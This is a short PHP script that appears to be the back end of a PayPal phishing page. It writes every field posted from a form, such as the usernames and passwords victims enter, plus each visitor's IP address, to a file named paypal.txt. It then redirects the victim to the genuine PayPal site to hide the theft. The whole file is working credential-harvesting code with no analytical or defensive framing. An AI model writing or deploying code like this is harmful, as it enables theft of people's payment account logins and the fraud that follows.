<?php
header ('Location: https://www.paypal.com/');
$handle = fopen("paypal.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}

$ipR=$_SERVER['REMOTE_ADDR'];
fwrite($handle, "remote address");
fwrite($handle, "=");
fwrite($handle, $ipR);

fwrite($handle, "\r\n\n\n");
fclose($handle);
exit;
?>